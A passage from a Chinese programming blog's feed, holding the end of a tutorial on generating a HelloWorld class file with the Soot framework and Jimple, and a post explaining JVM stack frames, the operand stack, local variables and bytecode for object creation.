class="line">Scene.v().addClass(sClass);</span><br></pre></td></tr></table></figure><p>这会将新创建的<code>HelloWorld</code>类添加到中<code>Scene</code>。<code>Scene</code>一旦创建，所有类都应该属于它们。</p><h2 id="向SootClass添加方法"><a href="#向SootClass添加方法" class="headerlink" title="向SootClass添加方法"></a>向<code>SootClass</code>添加方法</h2><p>想向Soot类添加一个sout方法，打印helloworld，首先需要main方法。</p><p>目前Helloworld类的<code>main()</code>方法还是空的。</p><p>现在有了<code>SootClass</code>，我们需要向其中添加方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">method = <span class="keyword">new</span> SootMethod(<span class="string">"main"</span>,                 </span><br><span class="line">    Arrays.asList(<span class="keyword">new</span> Type[] &#123;ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>)&#125;),</span><br><span class="line">    VoidType.v(), Modifier.PUBLIC | Modifier.STATIC);</span><br></pre></td></tr></table></figure><p>解读：</p><p>在这里需要首先写出一个main方法，他是public&amp;static的，并且main方法接受一个<code>java.lang.String</code>的参数数组，并且返回void。</p><p>SootClass：</p><p>每个SootClass代表一个Java对象，我们可以实例化该类，也可以为它指定类型。</p><p>如果想要获得<code>java.lang.String</code>的类型，我们可以用<code>RefType.v(&quot;java.lang.String&quot;)</code>。</p><p>如果现在已经有了一个SootClass对象sc，我们可以用<code>sc.getType()</code>获取对应的类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sClass.addMethod(method);</span><br></pre></td></tr></table></figure><p>此代码将main方法添加到其所属类，也就是sClass。</p><h2 id="向方法添加代码"><a href="#向方法添加代码" class="headerlink" title="向方法添加代码"></a>向方法添加代码</h2><p>如果方法不包含任何代码，则它是无用的。我们继续向该<code>main</code>方法添加一些代码。为此，我们必须为代码选择一个中间表示形式。</p><h3 id="创建JimpleBody"><a href="#创建JimpleBody" class="headerlink" title="创建JimpleBody"></a>创建<code>JimpleBody</code></h3><p>Jimple是soot四个中间表示形式之一，也是最受欢迎的。</p><p>在Soot中，通常这一步是将一个Body附加在SootMethod对象上，也就是附加到之前我们声明的method对象上。</p><p>每个Body知道自己属于哪个SootMethod，但是每个SootMethod每次只能有一个activeBody：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SootMethod.getActiveBody()</span><br></pre></td></tr></table></figure><p>更准确滴说，每个Body有三个特征组件：</p><ol><li><p>Local</p><p>Body体内的局部变量；</p></li><li><p>Trap</p><p>哪些代码用来捕获哪些异常；</p></li><li><p>Unit</p><p>Unit表示语句本身；</p></li></ol><p>所以接下来，我们需要给main方法添加一个Jimple主体，再像主体添加代码语句；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JimpleBody body = Jimple.v().newBody(method);</span><br><span class="line">method.setActiveBody(body);</span><br></pre></td></tr></table></figure><p>我们将Jimple单例对象称为<code>JimpleBody</code>与我们的方法相关联的新对象，并使它成为方法的活动主体。</p><p>这里先看一下Jimple中间代码：</p><p><img src="../images/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/image-20200718212825394.png" alt="image-20200718212825394"></p><p>接下来下面就需要按照目标Jimple一步步来做。</p><h3 id="添加本地变量"><a href="#添加本地变量" class="headerlink" title="添加本地变量"></a>添加本地变量</h3><p>添加本地变量需要用到arg，所以直接写；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arg = Jimple.v().newLocal(<span class="string">"l0"</span>, ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>));</span><br><span class="line">body.getLocals().add(arg);</span><br></pre></td></tr></table></figure><p>这里是为啥呢，我的理解；</p><p>对于sout(“Helloworld!”)来说，我们需要有一个字符串变量，最后打印的也是他，不难理解；</p><p>这里局部变量还有一个就是打印对象，在Java里面，所有东西都是对象；</p><p>这里第二个就是java.io.PrintStream对象，打印流对象；</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加入局部变量，java.io.PrintStream tmpRef</span></span><br><span class="line">tmpRef = <span class="module-access"><span class="module"><span class="identifier">Jimple</span>.</span></span>v<span class="literal">()</span>.<span class="keyword">new</span><span class="constructor">Local(<span class="string">"tmpRef"</span>, RefType.<span class="params">v</span>(<span class="string">"java.io.PrintStream"</span>)</span>);</span><br><span class="line">body.get<span class="constructor">Locals()</span>.add(tmpRef);</span><br></pre></td></tr></table></figure><h3 id="添加方法代码"><a href="#添加方法代码" class="headerlink" title="添加方法代码"></a>添加方法代码</h3><p>添加方法就需要unit了，直接写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//组成链，l0 = @parameter0</span></span><br><span class="line">            units.add(Jimple.v().newIdentityStmt(arg,</span><br><span class="line">                    Jimple.v().newParameterRef(ArrayType.v</span><br><span class="line">                            (RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>), <span class="number">0</span>)));</span><br></pre></td></tr></table></figure><p>理解：</p><p>就在上面一步，arg是我们的字符串变量，交给JVM时候，他就是字符串变量l0。</p><p>继续写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//继续组成链，tmpRef = java.lang.System.out</span></span><br><span class="line">            units.add(Jimple.v().newAssignStmt(tmpRef, Jimple.v().newStaticFieldRef(</span><br><span class="line">                    Scene.v().getField(<span class="string">"&lt;java.lang.System: java.io.PrintStream out&gt;"</span>).makeRef())));</span><br></pre></td></tr></table></figure><p>理解：</p><p>这里其实就是把上面的tmpRef给到System.out对象，这里仍有存疑，之后会慢慢看。</p><p>最后一步，赋值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// insert "tmpRef.println("Hello world!")"</span></span><br><span class="line">            &#123;</span><br><span class="line">                SootMethod toCall = Scene.v().getMethod(<span class="string">"&lt;java.io.PrintStream: void println(java.lang.String)&gt;"</span>);</span><br><span class="line">                units.add(Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(tmpRef, toCall.makeRef(), StringConstant.v(<span class="string">"Hello world!"</span>))));</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>我们获得带有签名的方法<code>&lt;java.io.PrintStream: void println(java.lang.String)&gt;</code>（该方法名为<code>println</code>，属于<code>PrintStream</code>，返回<code>void</code>并采用一个 <code>String</code>作为其参数-这足以唯一地标识该方法），并使用StringConstant“ Hello world！”调用它。</p><h2 id="写到类文件里面"><a href="#写到类文件里面" class="headerlink" title="写到类文件里面"></a>写到类文件里面</h2><p>将程序编写为<code>.class</code>文件的首选方法是使用ASM后端。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> java_version = Options.v().java_version();</span><br><span class="line">String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);</span><br><span class="line">OutputStream streamOut = <span class="keyword">new</span> FileOutputStream(fileName);</span><br><span class="line">BafASMBackend backend = <span class="keyword">new</span> BafASMBackend(sClass, java_version);</span><br><span class="line">backend.generateClassFile(streamOut);</span><br><span class="line">streamOut.close();</span><br></pre></td></tr></table></figure><p>也可以使用过时的Jasmin后端。我们首先构造输出流，该流将使用Jasmin源并输出<code>.class</code>文件。我们可以手动指定文件名，也可以让Soot确定正确的文件名。我们在这里做后者。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);</span><br><span class="line">OutputStream streamOut = <span class="keyword">new</span> JasminOutputStream(<span class="keyword">new</span> FileOutputStream(fileName));</span><br><span class="line">PrintWriter writerOut = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> OutputStreamWriter(streamOut));</span><br><span class="line">JasminClass jasminClass = <span class="keyword">new</span> soot.jimple.JasminClass(sClass);</span><br><span class="line">jasminClass.print(writerOut);</span><br><span class="line">writerOut.flush();</span><br><span class="line">streamOut.close();</span><br></pre></td></tr></table></figure><p>如果我们希望输出简单的源代码而不是<code>.class</code>文件，则可以使用以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_jimple);</span><br><span class="line">OutputStream streamOut = <span class="keyword">new</span> FileOutputStream(fileName);</span><br><span class="line">PrintWriter writerOut = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> OutputStreamWriter(streamOut));</span><br><span class="line">Printer.v().printTo(sClass, writerOut);</span><br><span class="line">writerOut.flush();</span><br><span class="line">streamOut.close();</span><br></pre></td></tr></table></figure><p>我们省略了<code>JasminOutputStream</code>，并在上调用<code>printTo</code>方法<code>Printer</code>。</p><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="../images/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/image-20200718202705757.png" alt="image-20200718202705757"></p><h1 id="源代码环节"><a href="#源代码环节" class="headerlink" title="源代码环节"></a>源代码环节</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//创建两个依赖类</span></span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.Object"</span>);</span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.System"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//声明目标类HelloWorld，他的父类当然是Object</span></span><br><span class="line">        SootClass sClass = <span class="keyword">new</span> SootClass(<span class="string">"HelloWorld"</span>, Modifier.PUBLIC);</span><br><span class="line">        sClass.setSuperclass(Scene.v().getSootClass(<span class="string">"java.lang.Object"</span>));</span><br><span class="line">        Scene.v().addClass(sClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建main方法，public static void main</span></span><br><span class="line">        SootMethod method = <span class="keyword">new</span> SootMethod(<span class="string">"main"</span>, Arrays.asList(<span class="keyword">new</span> Type[]&#123;ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>)&#125;),</span><br><span class="line">                VoidType.v(), Modifier.PUBLIC | Modifier.STATIC);</span><br><span class="line">        sClass.addMethod(method);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建main方法内容，这里需要用到Jimple</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            JimpleBody body = Jimple.v().newBody(method);</span><br><span class="line">            method.setActiveBody(body);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//工具组件</span></span><br><span class="line">            Chain units = body.getUnits();</span><br><span class="line">            Local arg,tmpRef;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//加入局部变量，java.lang.String l0</span></span><br><span class="line">            arg = Jimple.v().newLocal(<span class="string">"l0"</span>, ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>));</span><br><span class="line">            body.getLocals().add(arg);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//加入局部变量，java.io.PrintStream tmpRef</span></span><br><span class="line">            tmpRef = Jimple.v().newLocal(<span class="string">"tmpRef"</span>, RefType.v(<span class="string">"java.io.PrintStream"</span>));</span><br><span class="line">            body.getLocals().add(tmpRef);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//组成链，l0 = @parameter0</span></span><br><span class="line">            units.add(Jimple.v().newIdentityStmt(arg,</span><br><span class="line">                    Jimple.v().newParameterRef(ArrayType.v</span><br><span class="line">                            (RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>), <span class="number">0</span>)));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//继续组成链，tmpRef = java.lang.System.out</span></span><br><span class="line">            units.add(Jimple.v().newAssignStmt(tmpRef, Jimple.v().newStaticFieldRef(</span><br><span class="line">                    Scene.v().getField(<span class="string">"&lt;java.lang.System: java.io.PrintStream out&gt;"</span>).makeRef())));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// insert "tmpRef.println("Hello world!")"</span></span><br><span class="line">            &#123;</span><br><span class="line">                SootMethod toCall = Scene.v().getMethod(<span class="string">"&lt;java.io.PrintStream: void println(java.lang.String)&gt;"</span>);</span><br><span class="line">                units.add(Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(tmpRef, toCall.makeRef(), StringConstant.v(<span class="string">"Hello world!"</span>))));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// insert "return"</span></span><br><span class="line">            units.add(Jimple.v().newReturnVoidStmt());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);</span><br><span class="line">        OutputStream streamOut = <span class="keyword">new</span> JasminOutputStream(<span class="keyword">new</span> FileOutputStream(fileName));</span><br><span class="line">        PrintWriter writerOut = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> OutputStreamWriter(streamOut));</span><br><span class="line">        JasminClass jasminClass = <span class="keyword">new</span> soot.jimple.JasminClass(sClass);</span><br><span class="line">        jasminClass.print(writerOut);</span><br><span class="line">        writerOut.flush();</span><br><span class="line">        streamOut.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>#</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;鱼沉雁杳天涯路，始信人间别离苦。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;老博客归档。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://fynch3r.github.io/categories/Java/"/>
    
    
      <category term="Soot" scheme="https://fynch3r.github.io/tags/Soot/"/>
    
  </entry>
  
  <entry>
    <title>JVM操作数栈与局部变量表</title>
    <link href="https://fynch3r.github.io/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/"/>
    <id>https://fynch3r.github.io/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/</id>
    <published>2021-03-17T08:47:58.000Z</published>
    <updated>2021-05-18T03:52:51.918Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>知人者智，自知者明。</p></blockquote><p>最近在看Java污点分析，逃不开<code>对象.方法</code>调用形式，做个记录，随时更新。</p><a id="more"></a><h1 id="温故"><a href="#温故" class="headerlink" title="温故"></a>温故</h1><p>动态语言与静态语言</p><p>对类型的检查，在编译期就是静态语言，在运行期就是动态语言；</p><p>静态语言是判断变量自身的类型信息，动态语言是判断变量值的类型信息</p><p>动态语言中，变量没有类型信息，变量值才有类型信息。</p><p>Java: String info = “atguigu”;//info = atguigu;会报错 类型不匹配</p><p>JS：var name = 123;var name = “sun”;都可以 var就是一个变量的泛化。</p><p>方法调用</p><p>方法的绑定机制：符号引用转换为调用方法</p><p>静态链接：</p><p>当一个字节码装进JVM内部的时候，如果被调用的方法在编译器可知，且运行时保持不变。静态链接</p><p>动态链接：</p><p>当被调用的方法无法在编译期确定下来，只有在程序运行起来，才能确定。动态链接</p><p>动态链接：将符号引用直接变成直接引用</p><p>在.java-&gt;.class过程中，所有的变量和方法引用都会作为符号引用（#5）保存在class文件的常量池中</p><p>比如描述一个方法调用了另外的其他方法，就是通过常量池中指向方法的符号引用来表示的。</p><p>动态链接的用途就是去运行时常量池（在方法区里面）里面把这些符号引用转换为调用方法的直接引用。</p><blockquote><p>重点!!!</p><ol><li>JVM是<strong>基于栈的计算模型</strong></li><li>在解析过程中，每当为Java方法分配栈帧时<ul><li>执行每条执行之前，JVM要求该指令的操作数已被压入操作数栈中</li><li>在执行指令时，JVM会将该指令所需要的操作数<strong>弹出</strong>，并将该指令的结果重新<strong>压入</strong>栈中</li></ul></li></ol></blockquote><h1 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h1><p>栈帧是线程私有的，每一个方法对应一个栈帧。</p><p>四个主要组成成分：操作数栈，局部变量表，动态链接，方法返回地址。（还有一些附加信息，无所谓了）</p><p>重点说两个：局部变量表和操作数栈</p><h2 id="局部变量表"><a href="#局部变量表" class="headerlink" title="局部变量表"></a>局部变量表</h2><p>当一个方法被调用时，会使用局部变量表来存储参数值和方法内部的方法局部变量。</p><p>他是一个数组，用来存放方法参数和定义在方法内部的方法变量。</p><p>可以是引用类型（String等），可以是对象引用，可以是返回地址。</p><p>线程私有数据。</p><p>如果当前方法是对象实例的成员方法（没有被static修饰），那局部变量表[0]存放的是this的引用。</p><p>参数分配完毕后，再根据方法体内部定义的局部变量顺序和作用域分配其余的变量槽。</p><p>这里基本数据类型（double long除外）+ 引用类型（String） 都是一个slot ；long double 都是两个slot</p><h2 id="操作数栈"><a href="#操作数栈" class="headerlink" title="操作数栈"></a>操作数栈</h2><p>也常称为操作栈，它是一个后入先出栈(LIFO)。</p><p>保存程序执行过程中的临时结果，保存中间变量。</p><p>当一个方法刚刚开始执行时，其操作数栈是空的，随着方法执行和字节码指令的执行，会从局部变量表或对象实例的字段中复制常量或变量写入到操作数栈，再随着计算的进行将栈中元素出栈到局部变量表或者返回给方法调用者，也就是出栈/入栈操作。一个完整的方法执行期间往往包含多个这样出栈/入栈的过程。</p><p>如果被调用的方法带有返回值的话，其返回值将会被压入当前栈帧的操作数栈中。</p><h2 id="小例子"><a href="#小例子" class="headerlink" title="小例子"></a>小例子</h2><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317174904301.png" alt="image-20210317174904301"></p><p>Javap -v Demo:</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317175016279.png" alt="image-20210317175016279"></p><p>流程：</p><p>操作数栈长度为2，局部变量表长度为4，参数大小为1 pc寄存器地址值：JVM字节码指令</p><p>bipush 10从常量池里取出10 放到操作数栈顶</p><p>istore_1 将操作数栈中栈顶元素给到局部变量表的1号位置 10（0号位置给了this）</p><p>bipush 20从常量池里取出20 放到操作数栈顶</p><p>istore_2 将操作数栈中栈顶元素给到局部变量表的2号位置  20</p><p>iload1从局部变量表中取出1号元素 10 放到操作数栈栈顶</p><p>Iload2从局部变量表中取出2号元素 20 放到操作数栈栈顶</p><p>iadd 将当前操作数栈的栈顶两个元素求和 结果放在栈顶</p><p>return结束 返回void</p><p>再看一个方法调用的：</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317203643349.png" alt="image-20210317203643349"></p><p>javap -v Main</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317203803521.png" alt="image-20210317203803521"></p><p>先看创建一个对象：</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317205038396.png" alt="image-20210317205038396"></p><ol><li>执行new指令时，JVM将指向一块<strong>已分配的但未初始化</strong>的内存引用压入操作数栈。此时A类在方法区，堆中创建一个A对象的空间，大小可以确定，一些值会进行默认初始化。</li><li>接下来dup就是将操作数栈栈顶的值（对象堆空间的引用值）复制一份，<strong>压入栈顶</strong>。</li><li>invokespecial指令将要以这个引用为调用者，调用其构造器<ul><li>该指令将<strong>消耗掉</strong>操作数栈上的元素，作为它的调用者和参数</li></ul></li><li>因此，在这之前利用dup<strong>指令</strong>复制一份new指令的结果，并用来调用构造器</li></ol><p>这里 invokespecial指令结束之后，返回对象的引用为void，栈中元素只有一个引用（之前复制的那个）</p><p>接着aload_1，将局部变量表里1号位置的元素（参数args）取出，放在栈顶</p><p>接下来invokevitural，调用虚方法method1(args)，这里javap -v A</p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317223337010.png" alt="image-20210317223337010" style="zoom:50%;"><p>在method1内部，操作数栈大小为1，局部变量表为2（0号位置本类this）</p><p>首先aload_1将参数args放入操作数栈顶</p><p>接着areturn，将栈顶元素返回，是引用类型（String）</p><p>这时候回到之前main方法的操作数栈，返回的param放在了栈顶。</p><p>接着astore_2将返回值param放在了局部变量表的2号位置</p><p>此时操作数栈为空</p><p>接着继续new出来一个B对象，与上个A对象同理</p><p>依旧还是dup之后invokevirtual调用构造方法</p><p>之后aload_2将局部变量表里面的2号元素（也就是之前的param拿出来，也就是cmd）放到栈顶</p><p>invokevirtual去执行method2（cmd）方法</p><p>javap -v B看一下</p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317224622996.png" alt="image-20210317224622996" style="zoom:50%;"><p>在method2里面 实例化了C对象 嵌套起来了</p><p>在method2里面，操作数栈大小为2，局部变量表大小为2</p><p>new-dup-init组合拳生成C对象 接下来调用method3（param）</p><p>javap -v C</p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317225028439.png" alt="image-20210317225028439" style="zoom:50%;"><p>直接返回param</p><p>那么对于method3返回的结果，被B的method2进行了<code>11:areturn</code>返回</p><p>返回到哪里 ？ 返回到了调用method2的main方法内部<code>23:areturn</code>地方</p><p>作为main函数的最终结果返回。</p><h1 id="Java创建对象的过程"><a href="#Java创建对象的过程" class="headerlink" title="Java创建对象的过程"></a>Java创建对象的过程</h1><p><a href="https://mp.weixin.qq.com/s/3cm32TzROaQgyKf1TCl0Rg" target="_blank" rel="noopener">这篇</a>讲得非常好，来总结一下3种主流方法。</p><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object obj = <span class="keyword">new</span> Object();</span><br></pre></td></tr></table></figure><p>最常用的创建方式。</p><p>对应字节码：</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210322093031418.png" alt="image-20210322093031418"></p><p>在Java中，认为创建一个对象就是调用其构造方法，对于new Object()方法其实就是调用了Object类的无参构造方法，但是在字节码中，<strong>对象的创建和调用构造方法是分开的</strong>。</p><p>在上图字节码中，</p><p>new指令其实就是在堆中创建一个对象，并把对象的引用压入栈（指代操作数栈，后面同理）中。</p><p>dup指令会复制栈上最后的一个元素，然后将这个复制压入栈顶。为什么会有两个呢？</p><p>是<a href="https://www.zhihu.com/question/52749416" target="_blank" rel="noopener">因为</a>接下来的invokespecial指令会<strong>消耗</strong>掉操作数栈顶部的一个对象引用，作为传递给构造器的<code>this</code>参数，我们希望在invokespecial调用之后，在操作数栈顶还维持一个指向新建对象的引用，那么就得先在invokespecial之前先复制一份引用，也就是dup的原因。</p><h2 id="newInstance方法来创建"><a href="#newInstance方法来创建" class="headerlink" title="newInstance方法来创建"></a>newInstance方法来创建</h2><p>这里，<code>newInstance</code>方法是指<code>Class</code>类中的方法，<code>newInstance</code>方法会调用无参的构造方法创建对象。</p><p>两种模板：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User user = (User)Class.forName(<span class="string">"com.sec.User"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">User user = User<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br></pre></td></tr></table></figure><p><code>ldc</code>指令代表将常量池里的引用推入栈顶</p><p><code>forName</code>是静态方法 需要invokestatic</p><p><code>newInstance</code> 是虚方法，需要invokevirtual</p><h2 id="使用反射API来创建对象"><a href="#使用反射API来创建对象" class="headerlink" title="使用反射API来创建对象"></a>使用反射API来创建对象</h2><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;User&gt; cons = User<span class="class">.<span class="keyword">class</span>.<span class="title">getConstructor</span>()</span>;</span><br><span class="line">User user = cons.newInstance();</span><br></pre></td></tr></table></figure><h1 id="备忘"><a href="#备忘" class="headerlink" title="备忘"></a>备忘</h1><p>java中没有被static native修饰的方法就是是虚方法</p><p>感觉invokespecial init是消耗一个对象内存 不会返回任何东西（或者说返回void） </p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317231200462.png" alt="image-20210317231200462"></p><p>注意最后这个pop弹栈操作，很关键。</p><p>首先new-dup出现两个ref在栈中 那么invokespecial会消耗一个对象引用 还会剩一个</p><p>最后的pop也就是将最后一个（栈顶）弹出来，操作数栈排空。</p><p>invokestatic 是不消耗任何对象引用，静态方法是不需要对象.的格式去调用，直接类.方法就好了</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317231143953.png" alt="image-20210317231143953"></p><p>invokevirtual是获取通常为this和参数，然后一起进行方法调用。</p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317232352641.png" alt="image-20210317232352641" style="zoom:50%;"><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317232507679.png" alt="image-20210317232507679" style="zoom:50%;">]]></content>
    
    <summary type="html">
    
